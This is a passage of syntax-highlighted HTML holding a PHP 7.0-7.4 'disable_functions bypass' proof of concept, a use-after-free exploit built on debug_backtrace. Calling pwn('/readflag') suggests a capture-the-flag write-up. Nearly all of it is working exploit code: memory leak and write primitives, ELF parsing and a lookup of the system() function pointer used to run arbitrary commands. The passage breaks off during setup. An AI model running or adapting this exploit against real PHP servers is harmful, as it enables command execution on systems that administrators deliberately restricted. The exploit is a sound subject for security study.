&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Bug: https://bugs.php.net/bug.php?id=76047
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># debug_backtrace() returns a reference to a variable 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># that has been destroyed, causing a UAF vulnerability.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># This exploit should work on all PHP 7.0-7.4 versions
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># released as of 30/01/2020.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Author: https://github.com/mm0r1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">pwn&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/readflag&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">pwn&lt;/span>($cmd) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> $abc, $helper, $backtrace;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Vuln&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __destruct() { 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> $backtrace; 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">unset&lt;/span>($this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $backtrace &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span>)&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">getTrace&lt;/span>(); &lt;span style="color:#75715e"># ;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($backtrace[&lt;span style="color:#ae81ff">1&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;args&amp;#39;&lt;/span>])) { &lt;span style="color:#75715e"># PHP &amp;gt;= 7.4
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $backtrace &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">debug_backtrace&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Helper&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a, $b, $c, $d;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">str2ptr&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$str, $p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, $s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $address &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($j &lt;span style="color:#f92672">=&lt;/span> $s&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>; $j &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $j&lt;span style="color:#f92672">--&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $address &lt;span style="color:#f92672">&amp;lt;&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $address &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#a6e22e">ord&lt;/span>($str[$p&lt;span style="color:#f92672">+&lt;/span>$j]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $address;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">ptr2str&lt;/span>($ptr, $m &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $out &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ($i&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $m; $i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $out &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#a6e22e">chr&lt;/span>($ptr &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ptr &lt;span style="color:#f92672">&amp;gt;&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $out;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>$str, $p, $v, $n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $n; $i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $str[$p &lt;span style="color:#f92672">+&lt;/span> $i] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">chr&lt;/span>($v &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xff&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $v &lt;span style="color:#f92672">&amp;gt;&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr, $p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>, $s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">global&lt;/span> $abc, $helper;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write&lt;/span>($abc, &lt;span style="color:#ae81ff">0x68&lt;/span>, $addr &lt;span style="color:#f92672">+&lt;/span> $p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strlen&lt;/span>($helper&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($s &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) { $leak &lt;span style="color:#f92672">%=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> ($s &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $leak;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">parse_elf&lt;/span>($base) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_phoff &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x20&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_phentsize &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x36&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $e_phnum &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($base, &lt;span style="color:#ae81ff">0x38&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $e_phnum; $i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $header &lt;span style="color:#f92672">=&lt;/span> $base &lt;span style="color:#f92672">+&lt;/span> $e_phoff &lt;span style="color:#f92672">+&lt;/span> $i &lt;span style="color:#f92672">*&lt;/span> $e_phentsize;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_type &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_flags &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">4&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_vaddr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $p_memsz &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($header, &lt;span style="color:#ae81ff">0x28&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($p_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $p_flags &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>) { &lt;span style="color:#75715e"># PT_LOAD, PF_Read_Write
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e"># handle pie
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $data_addr &lt;span style="color:#f92672">=&lt;/span> $e_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">?&lt;/span> $p_vaddr &lt;span style="color:#f92672">:&lt;/span> $base &lt;span style="color:#f92672">+&lt;/span> $p_vaddr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $data_size &lt;span style="color:#f92672">=&lt;/span> $p_memsz;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>($p_type &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $p_flags &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>) { &lt;span style="color:#75715e"># PT_LOAD, PF_Read_exec
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $text_size &lt;span style="color:#f92672">=&lt;/span> $p_memsz;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$data_addr &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>$text_size &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>$data_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> [$data_addr, $text_size, $data_size];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_basic_funcs&lt;/span>($base, $elf) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">list&lt;/span>($data_addr, $text_size, $data_size) &lt;span style="color:#f92672">=&lt;/span> $elf;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> $data_size &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>; $i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($data_addr, $i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;lt;&lt;/span> $data_addr &lt;span style="color:#f92672">-&lt;/span> $base) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $deref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($leak);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;constant&amp;#39; constant check
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>($deref &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x746e6174736e6f63&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($data_addr, ($i &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> $leak &lt;span style="color:#f92672">-&lt;/span> $base &lt;span style="color:#f92672">&amp;lt;&lt;/span> $data_addr &lt;span style="color:#f92672">-&lt;/span> $base) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $deref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($leak);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># &amp;#39;bin2hex&amp;#39; constant check
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>($deref &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x786568326e6962&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">continue&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> $data_addr &lt;span style="color:#f92672">+&lt;/span> $i &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_binary_base&lt;/span>($binary_leak) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $base &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $start &lt;span style="color:#f92672">=&lt;/span> $binary_leak &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xfffffffffffff000&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; $i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span>; $i&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $addr &lt;span style="color:#f92672">=&lt;/span> $start &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x1000&lt;/span> &lt;span style="color:#f92672">*&lt;/span> $i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $leak &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">7&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($leak &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x10102464c457f&lt;/span>) { &lt;span style="color:#75715e"># ELF header
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> $addr;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_system&lt;/span>($basic_funcs) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $addr &lt;span style="color:#f92672">=&lt;/span> $basic_funcs;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">do&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $f_entry &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $f_name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($f_entry, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($f_name &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x6d6574737973&lt;/span>) { &lt;span style="color:#75715e"># system
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">leak&lt;/span>($addr &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $addr &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">while&lt;/span>($f_entry &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">trigger_uaf&lt;/span>($arg) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># str_shuffle prevents opcache string interning
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $arg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_shuffle&lt;/span>(&lt;span style="color:#a6e22e">str_repeat&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;A&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">79&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $vuln &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Vuln&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $vuln&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> $arg;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">stristr&lt;/span>(&lt;span style="color:#66d9ef">PHP_OS&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;WIN&amp;#39;&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;This PoC is for *nix systems only.&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $n_alloc &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>; &lt;span style="color:#75715e"># increase this value if UAF fails
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $contiguous &lt;span style="color:#f92672">=&lt;/span> [];
